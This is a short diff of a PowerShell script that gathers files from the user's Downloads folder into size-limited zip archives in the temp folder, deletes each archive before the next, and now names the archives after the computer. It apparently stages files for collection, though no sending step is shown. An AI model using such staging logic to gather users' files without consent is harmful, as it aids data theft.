@@ -6,7 +6,7 @@ param ([string[]]$FileType,[string[]]$Path)
 $maxZipFileSize = 25MB
 $currentZipSize = 0
 $index = 1
-$zipFilePath ="$env:temp/keys$index.zip"
+$zipFilePath ="$env:temp/$env:COMPUTERNAME.zip"
 
 $filesToZip = @(
     "$env:USERPROFILE\Downloads\key_1.pdf",
@@ -32,7 +32,7 @@ foreach ($filePath in $filesToZip) {
             Remove-Item -Path $zipFilePath -Force
             Sleep 1
             $index++
-            $zipFilePath ="$env:temp/keys$index.zip"
+            $zipFilePath ="$env:temp/$env:COMPUTERNAME.zip"
             $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
         }
 
